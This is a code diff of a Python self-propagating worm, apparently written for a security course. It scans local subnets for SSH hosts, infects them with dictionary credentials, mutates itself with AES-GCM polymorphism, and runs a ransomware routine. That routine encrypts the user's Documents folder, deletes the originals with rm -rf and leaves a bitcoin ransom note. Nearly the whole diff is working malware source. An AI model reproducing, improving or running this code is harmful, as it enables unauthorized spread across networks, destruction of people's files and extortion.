@@ -1,17 +1,17 @@
 #!/usr/bin/env python3
 """
 This worm does the following:
-  - If mutated (i.e. contains the AES‑GCM decryption wrapper), it decrypts
-    and executes its worm body.
-  - Otherwise, it scans for new target hosts (via SSH), infects them,
-    and then self‑mutates (AES‑GCM encryption) so that a new unique copy is
-    used for the next propagation cycle.
+  - If the file is mutated (i.e. contains the AES‑GCM decryption wrapper),
+    it decrypts and executes its worm body.
+  - Otherwise, it scans for new target hosts (via SSH),
+    infects them, and then self‑mutates so that a new unique copy is used
+    for the next propagation cycle.
 """
 
-import sys, os, base64, uuid, asyncio, subprocess, threading, traceback, logging
+import sys, os, base64, uuid, socket, subprocess, threading, traceback, logging
 from datetime import datetime
 from random import shuffle
-from concurrent.futures import ThreadPoolExecutor
+import concurrent.futures
 
 import netifaces
 from netaddr import IPAddress, IPNetwork, AddrFormatError
@@ -83,6 +83,7 @@ logger.addHandler(file_handler)
 
 # Worm configuration constants
 REMOTE_DIR = "/tmp/default/"
+HOME_DIR = f"/home/{os.getlogin()}"
 INFECTED_LOG = "infected.log"
 USERNAME_DICT = "username.txt"
 PASSWORD_DICT = "password.txt"
@@ -159,37 +160,10 @@ def polymorph_file(file_path):
 # Worm Core (Network Propagation Functions)
 ###########################################
 
-MAX_MUTATIONS = 2       # Maximum allowed self-mutations per machine
-home_path = f"/home/{os.getlogin()}"
-
-def deploy_ransomware():
-    """Encrypt and delete documents, then leave a ransom note."""
-    docs_dir = f"{home_path}/Documents"
-    tar_path = f"{home_path}/Documents.tar"
-    enc_path = f"{home_path}/Documents.tar.enc"
-    note_path = f"{home_path}/openme.txt"
-    if os.path.exists(note_path):
-        logger.info("Ransom note exists. Skipping ransomware action.")
-        return
-    if not os.path.exists(docs_dir):
-        logger.info("Documents directory not found. Skipping.")
-        return
-    try:
-        subprocess.check_call(["tar", "-cf", tar_path, docs_dir])
-        subprocess.check_call(["openssl", "enc", "-aes-256-cbc", "-salt", "-pbkdf2",
-                                 "-in", tar_path, "-out", enc_path, "-k", "cmpt783"])
-        subprocess.check_call(["rm", "-rf", docs_dir])
-        os.remove(tar_path)
-        with open(note_path, "w") as f:
-            f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
-        logger.error("Ransomware operation completed on this host.")
-    except Exception as e:
-        logger.error("Error during ransomware operation: " + str(e))
-
 def initiate_worm():
     """Perform scanning, infection, and mutation propagation."""
     # If ransomware note doesn't exist, perform ransom operation.
-    if not os.path.isfile(f"{home_path}/openme.txt"):
+    if not os.path.isfile(f"{HOME_DIR}/openme.txt"):
         deploy_ransomware()
     # Remove the debug log file if present
     #if os.path.isfile("/tmp/dmsg.log"):
@@ -215,7 +189,7 @@ def initiate_worm():
     update_infected_log(local_ips)
     logger.info("Scanning subnets for new targets...")
     
-    new_infections = False
+    infection_done = False
     for subnet in final_subnets:
         hosts = scan_network(subnet, local_ips)
         shuffle(hosts)
@@ -224,38 +198,43 @@ def initiate_worm():
         for host in hosts:
             if allowed(IPAddress(host)):
                 connect_via_ssh(host)
-                new_infections = True
+                infection_done = True
+                break
+        if infection_done:
+            break
 
-    if not new_infections:
-        logger.info("No new targets found. Self-mutating to ensure uniqueness.")
-        self_mutate()
-        #sys.exit(0)
+    if not infection_done:
+        if os.environ.get("SELF_MUTATED", "0") == "0":
+            os.environ["SELF_MUTATED"] = "1"
+            logger.info("No new targets found. Self-mutating to ensure uniqueness.")
+            self_mutate()
+        else:
+            logger.info("No new targets found and already self-mutated once. Terminating propagation.")
+            sys.exit(0)
 
-def self_mutate():
-    """
-    Self-mutates the worm by re-encrypting its worm body.
-    We limit the number of mutations to avoid endless loops on the last infected machine.
-    Uses an environment variable to track the mutation count.
-    """
-    # Get the current mutation count from the environment (default to 0)
-    mutation_count = int(os.environ.get("MUTATION_COUNT", "0"))
-    mutation_count += 1
-    if mutation_count > MAX_MUTATIONS:
-        logger.info("Maximum self-mutations reached. Terminating propagation on this host.")
-        sys.exit(0)
-    # Update the environment variable so the new process knows the mutation count.
-    os.environ["MUTATION_COUNT"] = str(mutation_count)
-    
-    current_file = os.path.abspath(sys.argv[0])
-    mutated_file = polymorph_file(current_file)
-    mutated_file_path = os.path.join(os.path.dirname(current_file), mutated_file)
-    os.chmod(mutated_file_path, 0o755)
-    logger.info(f"Self-mutation complete. New worm file: {mutated_file_path}")
-    
-    # Replace the current process with the new mutated worm, passing the updated environment.
-    for handler in logger.handlers:
-        handler.flush()
-    os.execv(mutated_file_path, sys.argv)
+def deploy_ransomware():
+    """Encrypt and delete documents, then leave a ransom note."""
+    docs_dir = f"{HOME_DIR}/Documents"
+    tar_path = f"{HOME_DIR}/Documents.tar"
+    enc_path = f"{HOME_DIR}/Documents.tar.enc"
+    note_path = f"{HOME_DIR}/openme.txt"
+    if os.path.exists(note_path):
+        logger.info("Ransom note exists. Skipping ransomware action.")
+        return
+    if not os.path.exists(docs_dir):
+        logger.info("Documents directory not found. Skipping.")
+        return
+    try:
+        subprocess.check_call(["tar", "-cf", tar_path, docs_dir])
+        subprocess.check_call(["openssl", "enc", "-aes-256-cbc", "-salt", "-pbkdf2",
+                                 "-in", tar_path, "-out", enc_path, "-k", "cmpt783"])
+        subprocess.check_call(["rm", "-rf", docs_dir])
+        os.remove(tar_path)
+        with open(note_path, "w") as f:
+            f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
+        logger.error("Ransomware operation completed on this host.")
+    except Exception as e:
+        logger.error("Error during ransomware operation: " + str(e))
 
 def local_addresses():
     """Retrieve local IPv4 addresses and associated CIDR subnets."""
@@ -296,18 +275,35 @@ def partition_subnet(subnet_list):
             new_subnet_list.append(subnet)
     return new_subnet_list
 
-async def async_is_host_up(ip, port=22, timeout=0.1):
+def is_host_up(ip, port=22, timeout=0.5):
     """
-    Asynchronously attempts to open a TCP connection to the given IP and port.
-    Returns True if the connection succeeds (host is up), False otherwise.
+    Attempts to open a TCP connection to the given IP and port.
+    Returns True if the connection succeeds, False otherwise.
     """
     try:
-        _, writer = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout)
-        writer.close()
-        await writer.wait_closed()
+        sock = socket.create_connection((ip, port), timeout=timeout)
+        sock.close()
         return True
-    except Exception:
+    except socket.error:
         return False
+
+def scan_hosts(candidate_hosts, port=22, timeout=0.5, max_workers=50):
+    """
+    Scans a list of candidate host IP addresses concurrently using a thread pool.
+    Returns a list of hosts for which a TCP connection to the specified port was successful.
+    """
+    discovered = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
+        # Submit all connection attempts concurrently.
+        futures = {executor.submit(is_host_up, host, port, timeout): host for host in candidate_hosts}
+        for future in concurrent.futures.as_completed(futures):
+            host = futures[future]
+            try:
+                if future.result():
+                    discovered.append(host)
+            except Exception as e:
+                pass
+    return discovered
 
 def scan_network(subnet, local_address_list):
     """
@@ -321,19 +317,9 @@ def scan_network(subnet, local_address_list):
     hosts = [str(ip) for ip in subnet.iter_hosts()]
     local_str = set(str(ip) for ip in local_address_list)
     candidate_hosts = [host for host in hosts if host not in attacked_ips and host not in local_str]
-
-    async def scan_candidates():
-        tasks = [async_is_host_up(host, port=22, timeout=0.1) for host in candidate_hosts]
-        results = await asyncio.gather(*tasks)
-        # Return only hosts where connection succeeded.
-        return [host for host, is_up in zip(candidate_hosts, results) if is_up]
-
-    discovered_hosts = asyncio.run(scan_candidates())
+    
+    discovered_hosts = scan_hosts(candidate_hosts, port=22, timeout=0.5)
     return discovered_hosts
-
-def filter_allowed(address_list):
-    """Return only addresses that belong to allowed subnets."""
-    return [address for address in address_list if allowed(address)]
 
 def allowed(address):
     """Check if an IP address is within allowed subnets and not blocked."""
@@ -344,6 +330,10 @@ def allowed(address):
         if address in IPNetwork(allowed_subnet) or address == IPNetwork(allowed_subnet):
             return True
     return False
+
+def filter_allowed(address_list):
+    """Return only addresses that belong to allowed subnets."""
+    return [address for address in address_list if allowed(address)]
 
 def update_infected_log(ip_list):
     """Update the infected log only with new IPs (as strings) that aren’t already logged."""
@@ -430,6 +420,19 @@ def spread(ssh):
     for handler in logger.handlers:
         handler.flush()
     sys.exit(0)
+
+def self_mutate():
+    """Self-mutates the worm by re-encrypting its worm body."""
+    current_file = os.path.abspath(sys.argv[0])
+    mutated_file = polymorph_file(current_file)
+    mutated_file_path = os.path.join(os.path.dirname(current_file), mutated_file)
+    os.chmod(mutated_file_path, 0o755)
+    logger.info(f"Self-mutation complete. New worm file: {mutated_file_path}")
+    
+    # Replace the current process with the new mutated worm, passing the updated environment.
+    for handler in logger.handlers:
+        handler.flush()
+    os.execv(mutated_file_path, sys.argv)
 
 def check_remote_infection_marker(ssh):
     """Check if the target machine already has the worm installed."""
